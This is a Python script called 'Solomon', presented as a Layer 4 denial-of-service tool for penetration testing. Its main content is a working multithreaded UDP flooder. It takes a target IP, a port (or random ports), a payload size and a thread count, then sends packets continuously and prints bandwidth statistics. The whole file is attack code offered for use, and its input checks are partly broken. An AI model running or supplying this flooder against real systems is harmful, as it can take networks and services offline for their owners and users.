# Solomon - DoS tools made in Python, specially made for penetration testing usage
# Github : InternalJava
# Import libraries
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep

# Variables
banner = """
███████╗ ██████╗ ██╗      ██████╗ ███╗   ███╗ ██████╗ ███╗   ██╗
██╔════╝██╔═══██╗██║     ██╔═══██╗████╗ ████║██╔═══██╗████╗  ██║
███████╗██║   ██║██║     ██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║
╚════██║██║   ██║██║     ██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║ (C) InternalJava
███████║╚██████╔╝███████╗╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
Solomon - Layer 4 DoS Tools
[@internaljava]
"""

# Attack functions (payload)
class Solomon:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):

        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000
        

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"Bytes/data sended: {round(size)} Mb/s | Total: => {round(self.total, 1)} Gb")

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

# Track/check functions
class check():
    def _Adress(ip : str):
        try:
            if ip.count('.') != 3:
                int('error')
            int(ip.replace('.',''))
        except:
            print("ERROR, Please enter a correct IP.")
    def _Port(port : int):
        if port == '':
            port = None 
        else:
            try:
                port = int(port)
                if port not in range(1, 65535 + 1):
                    int('error')
            except ValueError:
                print("ERROR, Please enter a correct port.")
    def _Bytes(bytes : int):
        if bytes == '':
            bytes = 1250
        else:
            try:
                bytes = int(bytes)
            except ValueError:
                print("ERROR, Please enter a valid bytes to send.")
    def _Threads(threads : int):
        if threads == '':
            threads = 100
        else:
            try:
                threads = int(threads)
            except ValueError:
                print("ERROR, Please enter a valid thread to use.")

# Main functions
def main():
    print(banner)
    ip = str(input("Enter IP Address: "))
    check._Adress(ip)
    port = int(input("Enter port (0-65535): "))
    check._Port(port)
    byte = int(input("Enter bytes to send: "))
    check._Bytes(byte)
    threads = int(input("Enter threads to use: "))
    check._Threads(threads)

    attack = Solomon(ip, port, byte, threads)
    try:
        attack.flood()
    except:
        attack.stop()
        print("Fatal error has occured.")
    try:
        while True:
            sleep(100000)
    except KeyboardInterrupt:
        attack.stop()
        print("Attack has been stopped.")

# Start the attack
if __name__ == "__main__":
    main()